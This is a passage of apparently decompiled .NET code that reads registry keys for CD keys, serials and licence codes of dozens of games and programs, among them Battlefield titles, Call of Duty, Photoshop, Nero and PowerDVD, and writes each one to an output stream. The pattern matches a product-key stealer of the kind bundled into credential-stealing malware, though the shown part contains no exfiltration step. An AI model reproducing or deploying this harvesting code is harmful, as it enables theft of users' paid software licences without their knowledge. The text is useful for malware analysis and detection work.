					text9 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Activision\\Call of duty 4\\", "codkey", null));
					goto IL_0317;
					IL_0317:
					num = 49;
					streamWriter.WriteLine("COD4 Steam Version : " + text9);
					goto IL_032d;
					IL_032d:
					num = 50;
					streamWriter.WriteLine(string.Empty);
					goto IL_033d;
					IL_033d:
					num = 51;
					streamWriter.Flush();
					goto IL_0348;
					IL_0348:
					ProjectData.ClearProjectError();
					num3 = -12;
					goto IL_0351;
					IL_0351:
					num = 53;
					text10 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty WAW", "codkey", null));
					goto IL_036c;
					IL_036c:
					num = 54;
					streamWriter.WriteLine("Call of Duty WAW : " + text10);
					goto IL_0383;
					IL_0383:
					num = 55;
					streamWriter.Flush();
					goto IL_038e;
					IL_038e:
					num = 56;
					streamWriter.WriteLine(string.Empty);
					goto IL_039e;
					IL_039e:
					num = 57;
					streamWriter.Flush();
					goto IL_03a9;
					IL_03a9:
					ProjectData.ClearProjectError();
					num3 = -13;
					goto IL_03b2;
					IL_03b2:
					num = 59;
					text11 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War", "CDKEY", null));
					goto IL_03cd;
					IL_03cd:
					num = 60;
					streamWriter.WriteLine("Dawn of War : " + text11);
					goto IL_03e4;
					IL_03e4:
					num = 61;
					streamWriter.Flush();
					goto IL_03ef;
					IL_03ef:
					num = 62;
					streamWriter.WriteLine(string.Empty);
					goto IL_03ff;
					IL_03ff:
					num = 63;
					streamWriter.Flush();
					goto IL_040a;
					IL_040a:
					ProjectData.ClearProjectError();
					num3 = -14;
					goto IL_0413;
					IL_0413:
					num = 65;
					text12 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War - Dark Crusade", "CDKEY", null));
					goto IL_042e;
					IL_042e:
					num = 66;
					streamWriter.WriteLine("Dawn of War - Dark Crusade : " + text12);
					goto IL_0445;
					IL_0445:
					num = 67;
					streamWriter.Flush();
					goto IL_0450;
					IL_0450:
					num = 68;
					streamWriter.WriteLine(string.Empty);
					goto IL_0460;
					IL_0460:
					num = 69;
					streamWriter.Flush();
					goto IL_046b;
					IL_046b:
					ProjectData.ClearProjectError();
					num3 = -15;
					goto IL_0474;
					IL_0474:
					num = 71;
					text13 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War - Dark Crusade", "W40KCDKEY", null));
					goto IL_048f;
					IL_048f:
					num = 72;
					streamWriter.WriteLine("Dawn of War - Dark Crusade : " + text13);
					goto IL_04a6;
					IL_04a6:
					num = 73;
					streamWriter.Flush();
					goto IL_04b1;
					IL_04b1:
					num = 74;
					streamWriter.WriteLine(string.Empty);
					goto IL_04c1;
					IL_04c1:
					num = 75;
					streamWriter.Flush();
					goto IL_04cc;
					IL_04cc:
					ProjectData.ClearProjectError();
					num3 = -16;
					goto IL_04d5;
					IL_04d5:
					num = 77;
					text14 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War - Dark Crusade", "WXPCDKEY", null));
					goto IL_04f0;
					IL_04f0:
					num = 78;
					streamWriter.WriteLine("Dawn of War - Dark Crusade : " + text14);
					goto IL_0507;
					IL_0507:
					num = 79;
					streamWriter.Flush();
					goto IL_0512;
					IL_0512:
					num = 80;
					streamWriter.WriteLine(string.Empty);
					goto IL_0522;
					IL_0522:
					num = 81;
					streamWriter.Flush();
					goto IL_052d;
					IL_052d:
					ProjectData.ClearProjectError();
					num3 = -17;
					goto IL_0536;
					IL_0536:
					num = 83;
					text15 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\SEGA\\Medieval II Total War", "CDKey", null));
					goto IL_0551;
					IL_0551:
					num = 84;
					streamWriter.WriteLine("Medieval II Total War : " + text15);
					goto IL_0568;
					IL_0568:
					num = 85;
					streamWriter.Flush();
					goto IL_0573;
					IL_0573:
					num = 86;
					streamWriter.WriteLine(string.Empty);
					goto IL_0583;
					IL_0583:
					num = 87;
					streamWriter.Flush();
					goto IL_058e;
					IL_058e:
					ProjectData.ClearProjectError();
					num3 = -18;
					goto IL_0597;
					IL_0597:
					num = 89;
					text16 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\Golive\\5.0\\Registration", "SERIAL", null));
					goto IL_05b2;
					IL_05b2:
					num = 90;
					streamWriter.WriteLine("Adobe Goolive : " + text16);
					goto IL_05c9;
					IL_05c9:
					num = 91;
					streamWriter.Flush();
					goto IL_05d4;
					IL_05d4:
					num = 92;
					streamWriter.WriteLine(string.Empty);
					goto IL_05e4;
					IL_05e4:
					num = 93;
					streamWriter.Flush();
					goto IL_05ef;
					IL_05ef:
					ProjectData.ClearProjectError();
					num3 = -19;
					goto IL_05f8;
					IL_05f8:
					num = 95;
					text17 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ahead\\Installation\\BAK\\Nero 7\\Info", "Serial7_1190555485", null));
					goto IL_0613;
					IL_0613:
					num = 96;
					streamWriter.WriteLine("Nero 7 : " + text17);
					goto IL_062a;
					IL_062a:
					num = 97;
					streamWriter.Flush();
					goto IL_0635;
					IL_0635:
					num = 98;
					streamWriter.WriteLine(string.Empty);
					goto IL_0645;
					IL_0645:
					num = 99;
					streamWriter.Flush();
					goto IL_0650;
					IL_0650:
					ProjectData.ClearProjectError();
					num3 = -20;
					goto IL_0659;
					IL_0659:
					num = 101;
					text18 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ACD Systems\\PicaView", "LicenseNumber", null));
					goto IL_0674;
					IL_0674:
					num = 102;
					streamWriter.WriteLine("ACDSystems PicAView : " + text18);
					goto IL_068b;
					IL_068b:
					num = 103;
					streamWriter.Flush();
					goto IL_0696;
					IL_0696:
					num = 104;
					streamWriter.WriteLine(string.Empty);
					goto IL_06a6;
					IL_06a6:
					num = 105;
					streamWriter.Flush();
					goto IL_06b1;
					IL_06b1:
					ProjectData.ClearProjectError();
					num3 = -21;
					goto IL_06ba;
					IL_06ba:
					num = 107;
					text19 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Eugen Systems\\ActOfWa", "RegNumber", null));
					goto IL_06d5;
					IL_06d5:
					num = 108;
					streamWriter.WriteLine("Act of War : " + text19);
					goto IL_06ec;
					IL_06ec:
					num = 109;
					streamWriter.Flush();
					goto IL_06f7;
					IL_06f7:
					num = 110;
					streamWriter.WriteLine(string.Empty);
					goto IL_0707;
					IL_0707:
					num = 111;
					streamWriter.Flush();
					goto IL_0712;
					IL_0712:
					ProjectData.ClearProjectError();
					num3 = -22;
					goto IL_071b;
					IL_071b:
					num = 113;
					text20 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\Photoshop\\7.0\\Registration", "SERIAL", null));
					goto IL_0736;
					IL_0736:
					num = 114;
					streamWriter.WriteLine("Adobe Photoshop 7 : " + text20);
					goto IL_074d;
					IL_074d:
					num = 115;
					streamWriter.Flush();
					goto IL_0758;
					IL_0758:
					num = 116;
					streamWriter.WriteLine(string.Empty);
					goto IL_0768;
					IL_0768:
					num = 117;
					streamWriter.Flush();
					goto IL_0773;
					IL_0773:
					ProjectData.ClearProjectError();
					num3 = -23;
					goto IL_077c;
					IL_077c:
					num = 119;
					text21 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced PDF Password Recovery\\Registration", "Code", null));
					goto IL_0797;
					IL_0797:
					num = 120;
					streamWriter.WriteLine("Advanced PDF Password Recovery : " + text21);
					goto IL_07ae;
					IL_07ae:
					num = 121;
					streamWriter.Flush();
					goto IL_07b9;
					IL_07b9:
					num = 122;
					streamWriter.WriteLine(string.Empty);
					goto IL_07c9;
					IL_07c9:
					num = 123;
					streamWriter.Flush();
					goto IL_07d4;
					IL_07d4:
					ProjectData.ClearProjectError();
					num3 = -24;
					goto IL_07dd;
					IL_07dd:
					num = 125;
					text22 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced PDF Password Recovery Pro\\Registration", "Code", null));
					goto IL_07f8;
					IL_07f8:
					num = 126;
					streamWriter.WriteLine("Advanced PDF Password Recovery Pro : " + text22);
					goto IL_080f;
					IL_080f:
					num = 127;
					streamWriter.Flush();
					goto IL_081a;
					IL_081a:
					num = 128;
					streamWriter.WriteLine(string.Empty);
					goto IL_082d;
					IL_082d:
					num = 129;
					streamWriter.Flush();
					goto IL_083b;
					IL_083b:
					ProjectData.ClearProjectError();
					num3 = -25;
					goto IL_0844;
					IL_0844:
					num = 131;
					text23 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced ZIP Password Recovery\\Registration", "Code", null));
					goto IL_0862;
					IL_0862:
					num = 132;
					streamWriter.WriteLine("Advanced ZIP Password Recovery : " + text23);
					goto IL_087c;
					IL_087c:
					num = 133;
					streamWriter.Flush();
					goto IL_088a;
					IL_088a:
					num = 134;
					streamWriter.WriteLine(string.Empty);
					goto IL_089d;
					IL_089d:
					num = 135;
					streamWriter.Flush();
					goto IL_08ab;
					IL_08ab:
					ProjectData.ClearProjectError();
					num3 = -26;
					goto IL_08b4;
					IL_08b4:
					num = 137;
					text24 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sunflowers\\Anno 1701", "SerialNo", null));
					goto IL_08d2;
					IL_08d2:
					num = 138;
					streamWriter.WriteLine("Anno 1701 : " + text24);
					goto IL_08ec;
					IL_08ec:
					num = 139;
					streamWriter.Flush();
					goto IL_08fa;
					IL_08fa:
					num = 140;
					streamWriter.WriteLine(string.Empty);
					goto IL_090d;
					IL_090d:
					num = 141;
					streamWriter.Flush();
					goto IL_091b;
					IL_091b:
					ProjectData.ClearProjectError();
					num3 = -27;
					goto IL_0924;
					IL_0924:
					num = 143;
					text25 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ashampoo\\Ashampoo WinOptimizer Platinum 3", "Key", null));
					goto IL_0942;
					IL_0942:
					num = 144;
					streamWriter.WriteLine("Ashamopp WinOptimizer Platinum : " + text25);
					goto IL_095c;
					IL_095c:
					num = 145;
					streamWriter.Flush();
					goto IL_096a;
					IL_096a:
					num = 146;
					streamWriter.WriteLine(string.Empty);
					goto IL_097d;
					IL_097d:
					num = 147;
					streamWriter.Flush();
					goto IL_098b;
					IL_098b:
					ProjectData.ClearProjectError();
					num3 = -28;
					goto IL_0994;
					IL_0994:
					num = 149;
					text26 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\@stake\\LC5\\Registration", "Unlock Code", null));
					goto IL_09b2;
					IL_09b2:
					num = 150;
					streamWriter.WriteLine("AV Voice Changer : " + text26);
					goto IL_09cc;
					IL_09cc:
					num = 151;
					streamWriter.Flush();
					goto IL_09da;
					IL_09da:
					num = 152;
					streamWriter.WriteLine(string.Empty);
					goto IL_09ed;
					IL_09ed:
					num = 153;
					streamWriter.Flush();
					goto IL_09fb;
					IL_09fb:
					ProjectData.ClearProjectError();
					num3 = -29;
					goto IL_0a04;
					IL_0a04:
					num = 155;
					text27 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942", "ergc", null));
					goto IL_0a22;
					IL_0a22:
					num = 156;
					streamWriter.WriteLine("Battlefield(1942) : " + text27);
					goto IL_0a3c;
					IL_0a3c:
					num = 157;
					streamWriter.Flush();
					goto IL_0a4a;
					IL_0a4a:
					num = 158;
					streamWriter.WriteLine(string.Empty);
					goto IL_0a5d;
					IL_0a5d:
					num = 159;
					streamWriter.Flush();
					goto IL_0a6b;
					IL_0a6b:
					ProjectData.ClearProjectError();
					num3 = -30;
					goto IL_0a74;
					IL_0a74:
					num = 161;
					text28 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 Secret Weapons of WWII", "ergc", null));
					goto IL_0a92;
					IL_0a92:
					num = 162;
					streamWriter.WriteLine("Battlefield 1942 Secret Weapons of WWII : " + text28);
					goto IL_0aac;
					IL_0aac:
					num = 163;
					streamWriter.Flush();
					goto IL_0aba;
					IL_0aba:
					num = 164;
					streamWriter.WriteLine(string.Empty);
					goto IL_0acd;
					IL_0acd:
					num = 165;
					streamWriter.Flush();
					goto IL_0adb;
					IL_0adb:
					ProjectData.ClearProjectError();
					num3 = -31;
					goto IL_0ae4;
					IL_0ae4:
					num = 167;
					text29 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome", "ergc", null));
					goto IL_0b02;
					IL_0b02:
					num = 168;
					streamWriter.WriteLine("Battlefield 1942 The Road to Rome : " + text29);
					goto IL_0b1c;
					IL_0b1c:
					num = 169;
					streamWriter.Flush();
					goto IL_0b2a;
					IL_0b2a:
					num = 170;
					streamWriter.WriteLine(string.Empty);
					goto IL_0b3d;
					IL_0b3d:
					num = 171;
					streamWriter.Flush();
					goto IL_0b4b;
					IL_0b4b:
					ProjectData.ClearProjectError();
					num3 = -32;
					goto IL_0b54;
					IL_0b54:
					num = 173;
					text30 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Battlefield 2", "ergc", null));
					goto IL_0b72;
					IL_0b72:
					num = 174;
					streamWriter.WriteLine("Battlefield 2 : " + text30);
					goto IL_0b8c;
					IL_0b8c:
					num = 175;
					streamWriter.Flush();
					goto IL_0b9a;
					IL_0b9a:
					num = 176;
					streamWriter.WriteLine(string.Empty);
					goto IL_0bad;
					IL_0bad:
					num = 177;
					streamWriter.Flush();
					goto IL_0bbb;
					IL_0bbb:
					ProjectData.ClearProjectError();
					num3 = -33;
					goto IL_0bc4;
					IL_0bc4:
					num = 179;
					text31 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 2142", "ergc", null));
					goto IL_0be2;
					IL_0be2:
					num = 180;
					streamWriter.WriteLine("Battlefield(2142) : " + text31);
					goto IL_0bfc;
					IL_0bfc:
					num = 181;
					streamWriter.Flush();
					goto IL_0c0a;
					IL_0c0a:
					num = 182;
					streamWriter.WriteLine(string.Empty);
					goto IL_0c1d;
					IL_0c1d:
					num = 183;
					streamWriter.Flush();
					goto IL_0c2b;
					IL_0c2b:
					ProjectData.ClearProjectError();
					num3 = -34;
					goto IL_0c34;
					IL_0c34:
					num = 185;
					text32 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Battlefield Vietnam", "ergc", null));
					goto IL_0c52;
					IL_0c52:
					num = 186;
					streamWriter.WriteLine("Battlefield Vietnam : " + text32);
					goto IL_0c6c;
					IL_0c6c:
					num = 187;
					streamWriter.Flush();
					goto IL_0c7a;
					IL_0c7a:
					num = 188;
					streamWriter.WriteLine(string.Empty);
					goto IL_0c8d;
					IL_0c8d:
					num = 189;
					streamWriter.Flush();
					goto IL_0c9b;
					IL_0c9b:
					ProjectData.ClearProjectError();
					num3 = -35;
					goto IL_0ca4;
					IL_0ca4:
					num = 191;
					text33 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Black and White", "ergc", null));
					goto IL_0cc2;
					IL_0cc2:
					num = 192;
					streamWriter.WriteLine("Black and White : " + text33);
					goto IL_0cdc;
					IL_0cdc:
					num = 193;
					streamWriter.Flush();
					goto IL_0cea;
					IL_0cea:
					num = 194;
					streamWriter.WriteLine(string.Empty);
					goto IL_0cfd;
					IL_0cfd:
					num = 195;
					streamWriter.Flush();
					goto IL_0d0b;
					IL_0d0b:
					ProjectData.ClearProjectError();
					num3 = -36;
					goto IL_0d14;
					IL_0d14:
					num = 197;
					text34 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Black and White 2", "ergc", null));
					goto IL_0d32;
					IL_0d32:
					num = 198;
					streamWriter.WriteLine("Black and White 2 : " + text34);
					goto IL_0d4c;
					IL_0d4c:
					num = 199;
					streamWriter.Flush();
					goto IL_0d5a;
					IL_0d5a:
					num = 200;
					streamWriter.WriteLine(string.Empty);
					goto IL_0d6d;
					IL_0d6d:
					num = 201;
					streamWriter.Flush();
					goto IL_0d7b;
					IL_0d7b:
					ProjectData.ClearProjectError();
					num3 = -37;
					goto IL_0d84;
					IL_0d84:
					num = 203;
					text35 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Boulder Dash Rocks", "ergc", null));
					goto IL_0da2;
					IL_0da2:
					num = 204;
					streamWriter.WriteLine("Boulder Dash Rocks : " + text35);
					goto IL_0dbc;
					IL_0dbc:
					num = 205;
					streamWriter.Flush();
					goto IL_0dca;
					IL_0dca:
					num = 206;
					streamWriter.WriteLine(string.Empty);
					goto IL_0ddd;
					IL_0ddd:
					num = 207;
					streamWriter.Flush();
					goto IL_0deb;
					IL_0deb:
					ProjectData.ClearProjectError();
					num3 = -38;
					goto IL_0df4;
					IL_0df4:
					num = 209;
					text36 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Burnout Paradise", "ergc", null));
					goto IL_0e12;
					IL_0e12:
					num = 210;
					streamWriter.WriteLine("Burnout Paradise : " + text36);
					goto IL_0e2c;
					IL_0e2c:
					num = 211;
					streamWriter.Flush();
					goto IL_0e3a;
					IL_0e3a:
					num = 212;
					streamWriter.WriteLine(string.Empty);
					goto IL_0e4d;
					IL_0e4d:
					num = 213;
					streamWriter.Flush();
					goto IL_0e5b;
					IL_0e5b:
					ProjectData.ClearProjectError();
					num3 = -39;
					goto IL_0e64;
					IL_0e64:
					num = 215;
					text37 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\4.0", "RegisteredTo", null));
					goto IL_0e82;
					IL_0e82:
					num = 216;
					streamWriter.WriteLine("Camtasia Studio 4(Name) : " + text37);
					goto IL_0e9c;
					IL_0e9c:
					num = 217;
					streamWriter.Flush();
					goto IL_0eaa;
					IL_0eaa:
					num = 218;
					streamWriter.WriteLine(string.Empty);
					goto IL_0ebd;
					IL_0ebd:
					num = 219;
					streamWriter.Flush();
					goto IL_0ecb;
					IL_0ecb:
					ProjectData.ClearProjectError();
					num3 = -40;
					goto IL_0ed4;
					IL_0ed4:
					num = 221;
					text38 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\4.0", "RegistrationKey", null));
					goto IL_0ef2;
					IL_0ef2:
					num = 222;
					streamWriter.WriteLine("Camtasia Studio 4(Key) : " + text38);
					goto IL_0f0c;
					IL_0f0c:
					num = 223;
					streamWriter.Flush();
					goto IL_0f1a;
					IL_0f1a:
					num = 224;
					streamWriter.WriteLine(string.Empty);
					goto IL_0f2d;
					IL_0f2d:
					num = 225;
					streamWriter.Flush();
					goto IL_0f3b;
					IL_0f3b:
					ProjectData.ClearProjectError();
					num3 = -41;
					goto IL_0f44;
					IL_0f44:
					num = 227;
					text39 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Techland\\Chrome", "SerialNumber", null));
					goto IL_0f62;
					IL_0f62:
					num = 228;
					streamWriter.WriteLine("Chrome : " + text39);
					goto IL_0f7c;
					IL_0f7c:
					num = 229;
					streamWriter.Flush();
					goto IL_0f8a;
					IL_0f8a:
					num = 230;
					streamWriter.WriteLine(string.Empty);
					goto IL_0f9d;
					IL_0f9d:
					num = 231;
					streamWriter.Flush();
					goto IL_0fab;
					IL_0fab:
					ProjectData.ClearProjectError();
					num3 = -42;
					goto IL_0fb4;
					IL_0fb4:
					num = 233;
					text40 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Codec Tweak Tool", "serial", null));
					goto IL_0fd2;
					IL_0fd2:
					num = 234;
					streamWriter.WriteLine("Codec Tweak Tool : " + text40);
					goto IL_0fec;
					IL_0fec:
					num = 235;
					streamWriter.Flush();
					goto IL_0ffa;
					IL_0ffa:
					num = 236;
					streamWriter.WriteLine(string.Empty);
					goto IL_100d;
					IL_100d:
					num = 237;
					streamWriter.Flush();
					goto IL_101b;
					IL_101b:
					ProjectData.ClearProjectError();
					num3 = -43;
					goto IL_1024;
					IL_1024:
					num = 239;
					text41 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Generals", "ergc", null));
					goto IL_1042;
					IL_1042:
					num = 240;
					streamWriter.WriteLine("Command and Conquer Generals : " + text41);
					goto IL_105c;
					IL_105c:
					num = 241;
					streamWriter.Flush();
					goto IL_106a;
					IL_106a:
					num = 242;
					streamWriter.WriteLine(string.Empty);
					goto IL_107d;
					IL_107d:
					num = 243;
					streamWriter.Flush();
					goto IL_108b;
					IL_108b:
					ProjectData.ClearProjectError();
					num3 = -44;
					goto IL_1094;
					IL_1094:
					num = 245;
					text42 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Command and Conquer Generals Zero Hour", "ergc", null));
					goto IL_10b2;
					IL_10b2:
					num = 246;
					streamWriter.WriteLine("Command and Conquer Generals Zero Hour : " + text42);
					goto IL_10cc;
					IL_10cc:
					num = 247;
					streamWriter.Flush();
					goto IL_10da;
					IL_10da:
					num = 248;
					streamWriter.WriteLine(string.Empty);
					goto IL_10ed;
					IL_10ed:
					num = 249;
					streamWriter.Flush();
					goto IL_10fb;
					IL_10fb:
					ProjectData.ClearProjectError();
					num3 = -45;
					goto IL_1104;
					IL_1104:
					num = 251;
					text43 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Red Alert 2", "Serial", null));
					goto IL_1122;
					IL_1122:
					num = 252;
					streamWriter.WriteLine("Red Alert 2 : " + text43);
					goto IL_113c;
					IL_113c:
					num = 253;
					streamWriter.Flush();
					goto IL_114a;
					IL_114a:
					num = 254;
					streamWriter.WriteLine(string.Empty);
					goto IL_115d;
					IL_115d:
					num = 255;
					streamWriter.Flush();
					goto IL_116b;
					IL_116b:
					ProjectData.ClearProjectError();
					num3 = -46;
					goto IL_1174;
					IL_1174:
					num = 257;
					text44 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Red Alert", "Serial", null));
					goto IL_1192;
					IL_1192:
					num = 258;
					streamWriter.WriteLine("Red Alert : " + text44);
					goto IL_11ac;
					IL_11ac:
					num = 259;
					streamWriter.Flush();
					goto IL_11ba;
					IL_11ba:
					num = 260;
					streamWriter.WriteLine(string.Empty);
					goto IL_11cd;
					IL_11cd:
					num = 261;
					streamWriter.Flush();
					goto IL_11db;
					IL_11db:
					ProjectData.ClearProjectError();
					num3 = -47;
					goto IL_11e4;
					IL_11e4:
					num = 263;
					text45 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Tiberian Sun", "Serial", null));
					goto IL_1202;
					IL_1202:
					num = 264;
					streamWriter.WriteLine("Command and Conquer Tiberian Sun : " + text45);
					goto IL_121c;
					IL_121c:
					num = 265;
					streamWriter.Flush();
					goto IL_122a;
					IL_122a:
					num = 266;
					streamWriter.WriteLine(string.Empty);
					goto IL_123d;
					IL_123d:
					num = 267;
					streamWriter.Flush();
					goto IL_124b;
					IL_124b:
					ProjectData.ClearProjectError();
					num3 = -48;
					goto IL_1254;
					IL_1254:
					num = 269;
					text46 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Command and Conquer 3", "ergc", null));
					goto IL_1272;
					IL_1272:
					num = 270;
					streamWriter.WriteLine("Command and Conquer 3 : " + text46);
					goto IL_128c;
					IL_128c:
					num = 271;
					streamWriter.Flush();
					goto IL_129a;
					IL_129a:
					num = 272;
					streamWriter.WriteLine(string.Empty);
					goto IL_12ad;
					IL_12ad:
					num = 273;
					streamWriter.Flush();
					goto IL_12bb;
					IL_12bb:
					ProjectData.ClearProjectError();
					num3 = -49;
					goto IL_12c4;
					IL_12c4:
					num = 275;
					text47 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Command and Conquer 3", "ergc", null));
					goto IL_12e2;
					IL_12e2:
					num = 276;
					streamWriter.WriteLine("Command and Conquer 3 : " + text47);
					goto IL_12fc;
					IL_12fc:
					num = 277;
					streamWriter.Flush();
					goto IL_130a;
					IL_130a:
					num = 278;
					streamWriter.WriteLine(string.Empty);
					goto IL_131d;
					IL_131d:
					num = 279;
					streamWriter.Flush();
					goto IL_132b;
					IL_132b:
					ProjectData.ClearProjectError();
					num3 = -50;
					goto IL_1334;
					IL_1334:
					num = 281;
					text48 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Company of Heroes", "CoHProductKey", null));
					goto IL_1352;
					IL_1352:
					num = 282;
					streamWriter.WriteLine("Company of Heroes : " + text48);
					goto IL_136c;
					IL_136c:
					num = 283;
					streamWriter.Flush();
					goto IL_137a;
					IL_137a:
					num = 284;
					streamWriter.WriteLine(string.Empty);
					goto IL_138d;
					IL_138d:
					num = 285;
					streamWriter.Flush();
					goto IL_139b;
					IL_139b:
					ProjectData.ClearProjectError();
					num3 = -51;
					goto IL_13a4;
					IL_13a4:
					num = 287;
					text49 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Company of Heroes", "CoHOFProductKey", null));
					goto IL_13c2;
					IL_13c2:
					num = 288;
					streamWriter.WriteLine("Company of Heroes : " + text49);
					goto IL_13dc;
					IL_13dc:
					num = 289;
					streamWriter.Flush();
					goto IL_13ea;
					IL_13ea:
					num = 290;
					streamWriter.WriteLine(string.Empty);
					goto IL_13fd;
					IL_13fd:
					num = 291;
					streamWriter.Flush();
					goto IL_140b;
					IL_140b:
					ProjectData.ClearProjectError();
					num3 = -52;
					goto IL_1414;
					IL_1414:
					num = 293;
					text50 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Counter-Strike\\Settings", "Key", null));
					goto IL_1432;
					IL_1432:
					num = 294;
					streamWriter.WriteLine("Counter-Strike : " + text50);
					goto IL_144c;
					IL_144c:
					num = 295;
					streamWriter.Flush();
					goto IL_145a;
					IL_145a:
					num = 296;
					streamWriter.WriteLine(string.Empty);
					goto IL_146d;
					IL_146d:
					num = 297;
					streamWriter.Flush();
					goto IL_147b;
					IL_147b:
					ProjectData.ClearProjectError();
					num3 = -53;
					goto IL_1484;
					IL_1484:
					num = 299;
					text51 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Crysis", "ergc", null));
					goto IL_14a2;
					IL_14a2:
					num = 300;
					streamWriter.WriteLine("Crysis : " + text51);
					goto IL_14bc;
					IL_14bc:
					num = 301;
					streamWriter.Flush();
					goto IL_14ca;
					IL_14ca:
					num = 302;
					streamWriter.WriteLine(string.Empty);
					goto IL_14dd;
					IL_14dd:
					num = 303;
					streamWriter.Flush();
					goto IL_14eb;
					IL_14eb:
					ProjectData.ClearProjectError();
					num3 = -54;
					goto IL_14f4;
					IL_14f4:
					num = 305;
					text52 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Cyberlink\\PowerDVD", "CDKey", null));
					goto IL_1512;
					IL_1512:
					num = 306;
					streamWriter.WriteLine("PowerDVD : " + text52);
					goto IL_152c;
					IL_152c:
					num = 307;
					streamWriter.Flush();
					goto IL_153a;
					IL_153a:
					num = 308;
					streamWriter.WriteLine(string.Empty);
					goto IL_154d;
					IL_154d:
					num = 309;
					streamWriter.Flush();
					goto IL_155b;
					IL_155b:
					ProjectData.ClearProjectError();
					num3 = -55;
					goto IL_1564;
					IL_1564:
					num = 311;
					text53 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Cyberlink\\PowerBar", "CDKey", null));
					goto IL_1582;
					IL_1582:
					num = 312;
					streamWriter.WriteLine("PowerBar : " + text53);
					goto IL_159c;
					IL_159c:
					num = 313;
					streamWriter.Flush();
					goto IL_15aa;
					IL_15aa:
					num = 314;
					streamWriter.WriteLine(string.Empty);
					goto IL_15bd;
					IL_15bd:
					num = 315;
					streamWriter.Flush();
					goto IL_15cb;
					IL_15cb:
					ProjectData.ClearProjectError();
					num3 = -56;
					goto IL_15d4;
					IL_15d4:
					num = 317;
					text54 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\CyberLink\\PowerProducer\\3.0\\UserReg", "SR_No", null));
					goto IL_15f2;
					IL_15f2:
					num = 318;
					streamWriter.WriteLine("CyberLink PowerProducer : " + text54);
					goto IL_160c;
					IL_160c:
					num = 319;
					streamWriter.Flush();
